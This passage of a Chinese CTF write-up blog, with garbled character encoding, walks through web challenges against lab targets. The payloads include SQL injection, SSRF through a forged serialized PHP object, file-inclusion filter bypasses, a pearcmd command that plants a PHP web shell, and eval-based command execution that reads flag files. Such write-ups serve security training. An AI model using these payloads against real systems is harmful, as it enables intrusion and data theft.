class="hljs-name">servlet-name</span>&gt;</span>FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Flag<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>æ‰¾åˆ°flagçš„ä½ç½®<br>æ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class<br></code></pre></td></tr></table></figure>

<p>åœ¨ä¸‹è½½çš„æ–‡ä»¶ä¸­æ‰¾åˆ°ä¸€ä¸²base64åŠ å¯†åçš„å­—ç¬¦ä¸² ï¼ˆå› ä¸ºæ˜¯ç­‰å·ç»“å°¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ZmxhZ3swYWZkMTE1NC1jNTE0LTQzYTUtODY4YS02NjMxODkzMTg3ZWN9Cg==<br></code></pre></td></tr></table></figure>

<p>è§£å¯†åå³å¾—åˆ°flag</p>
<h3 id="22ã€-ç½‘é¼æ¯-2018-Fakebook"><a href="#22ã€-ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="22ã€[ç½‘é¼æ¯ 2018]Fakebook"></a>22ã€[ç½‘é¼æ¯ 2018]Fakebook</h3><p>å‘ç°æœ‰robots.txt è®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">User-agent: *<br>Disallow: /user.php.bak<br></code></pre></td></tr></table></figure>

<p>è®¿é—®åå¾—åˆ°æºç çš„å¤‡ä»½æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æ³¨å†Œæ—¶blogçš„å¡«å†™å¿…é¡»è¦httpå¼€å¤´çš„ç½‘å€<br>æ³¨å†ŒæˆåŠŸåç‚¹è¿›å» å‘ç°urlæ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=1<br></code></pre></td></tr></table></figure>

<p>çŒœæµ‹noå­˜åœ¨sqlæ³¨å…¥<br>fuzzåå‘ç°select å’Œ unionéƒ½æ²¡è¢«è¿‡æ»¤ çŒœæµ‹æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤ ä½¿ç”¨&#x2F; ** &#x2F;ç»•è¿‡<br>è”åˆæŸ¥è¯¢çˆ†å‡ºè¡¨çš„é•¿åº¦ å¹¶ä¸”çŸ¥é“å›æ˜¾ä½æ˜¯2 åŒæ—¶å‘ç°å­˜åœ¨ååºåˆ—åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,2,3,4<br></code></pre></td></tr></table></figure>

<p>ç»§ç»­è·å¾—æ•°æ®åº“åç§° fakebook</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,database(),3,4<br></code></pre></td></tr></table></figure>

<p>ç»§ç»­è·å¾—è¡¨å users</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,TABLE_NAME,3,4 FROM information_schema.tables WHERE TABLE_SCHEMA=database() <br></code></pre></td></tr></table></figure>

<p>ç»§ç»­è·å–åˆ—å<br>|no,username,passwd,data|</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,GROUP_CONCAT(column_name),3,4 from information_schema.columns WHERE TABLE_SCHEMA=database() <br></code></pre></td></tr></table></figure>

<p>è·å–å­—æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,GROUP_CONCAT(no,username,passwd,data),3,4 from users<br></code></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1adminc7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ecO:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:15:&quot;http://fasd.com&quot;;&#125;v<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çŒœæµ‹flagä¹Ÿåœ¨æŠ¥é”™çš„å½“å‰ç›®å½•ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/var/www/html/view.php<br></code></pre></td></tr></table></figure>

<p>æ–¹æ³•ä¸€ï¼šssrfæ¼æ´<br>payloadå¦‚ä¸‹ å› ä¸ºdataå­—æ®µåœ¨ç¬¬4ä¸ªä½ç½®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;<br></code></pre></td></tr></table></figure>

<p>åœ¨æºç ä¸­å‘ç°äº†flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;!--?php<br><br>$flag = &quot;flag&#123;1c940269-22ec-4be3-9486-e4a4d10e2474&#125;&quot;;<br>exit(0);<br>--&gt;<br></code></pre></td></tr></table></figure>

<p>æ–¹æ³•äºŒï¼š<br>load_fileå‡½æ•°<br>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4<br></code></pre></td></tr></table></figure>

<p>åŒæ ·èƒ½æ‰¾åˆ°flag</p>
<h3 id="23ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-Include-ğŸ"><a href="#23ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-Include-ğŸ" class="headerlink" title="23ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ"></a>23ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ</h3><p>é¢˜ç›®ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];  <br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);  <br>        &#125;  <br><br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);        <span class="hljs-comment"># Something in phpinfo.php!    &#125;  </span><br>    <span class="hljs-keyword">else</span> &#123;        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†å¸¸è§çš„æ–‡ä»¶åŒ…å«åè®® ä½†æ˜¯å¯ä»¥ä¼ å…¥å‚æ•°file<br>ä½¿ç”¨fileåè®®æŸ¥çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=file:///var/www/html/phpinfo<br></code></pre></td></tr></table></figure>

<p>æœç´¢flag æ‰¾åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">|fake&#123;Check_register_argc_argv&#125;|<br></code></pre></td></tr></table></figure>

<p>ç»§ç»­æŸ¥æ‰¾register_argc_argv å‘ç°ä¸¤ä¸ªon<br>æ„é€ payload ä½¿ç”¨burpæŠ“åŒ…ä¼ å‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=/usr/local/lib/php/pearcmd&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[1]`;?&gt;+nene.php<br></code></pre></td></tr></table></figure>

<p>æœ€åè®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/nene.php<br></code></pre></td></tr></table></figure>

<p>POSTæ–¹æ³•ä¼ å…¥å‚æ•° å³å¯è·å¾—flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1=cat /f*<br></code></pre></td></tr></table></figure>

<h3 id="24ã€-VNCTF2023-è±¡æ£‹ç‹å­"><a href="#24ã€-VNCTF2023-è±¡æ£‹ç‹å­" class="headerlink" title="24ã€[VNCTF2023]è±¡æ£‹ç‹å­"></a>24ã€[VNCTF2023]è±¡æ£‹ç‹å­</h3><p>æŸ¥çœ‹æºä»£ç  å‘ç°æœ‰jsfuckåŠ å¯†<br>å¤åˆ¶ä¸‹æ¥ åœ¨æ§åˆ¶å°è·‘ä¸€ä¸‹ å³å¯</p>
<h3 id="25ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-PHP"><a href="#25ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-PHP" class="headerlink" title="25ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of PHP"></a>25ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of PHP</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ„Ÿè§‰å¯ä»¥å¤§é‡ä½¿ç”¨æ•°ç»„è¿›è¡Œç»•è¿‡ æ³¨æ„GET&#x2F;POSTæ–¹æ³•<br>å‰é¢å››éƒ¨åˆ†éƒ½å¯åˆ©ç”¨å¼±æ¯”è¾ƒçš„ç‰¹æ€§ ä½¿ç”¨æ•°ç»„ç»•è¿‡<br>æœ€åä¸€éƒ¨åˆ† extractå‡½æ•°çš„ç»•è¿‡æ–¹æ³• POST</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">flag5=.<br></code></pre></td></tr></table></figure>

<p>è¿™æ˜¯å› ä¸ºè¦æ±‚flag5å‚æ•°çš„å€¼ä¸åŒ…å«[a-zA-Z0-9]ï¼Œå³ä¸åŒ…å«å­—æ¯å’Œæ•°å­—ï¼Œç”¨å­—ç¬¦ç»•è¿‡å³å¯ã€‚</p>
<h3 id="26ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-include-0ã€‚0"><a href="#26ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-include-0ã€‚0" class="headerlink" title="26ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]include 0ã€‚0"></a>26ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]include 0ã€‚0</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> nope<br></code></pre></td></tr></table></figure>

<p>GETä¼ å‚è·å–file åº”è¯¥æ˜¯ç”¨phpä¼ªåè®®è¯»å–æ–‡ä»¶ è¿‡æ»¤äº†base64å’Œrot13ä¸¤ç§æ–¹å¼<br>é‚£å°±ä½¿ç”¨åå…­è¿›åˆ¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php<br></code></pre></td></tr></table></figure>

<h3 id="27ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E"><a href="#27ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E" class="headerlink" title="27ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]R!C!E!"></a>27ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]R!C!E!</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">password=6O48A7ZyA0nskVwOIGCQ&amp;e[v.a.l=echo(`cd /;l\s;more f?*?;`);<br></code></pre></td></tr></table></figure>

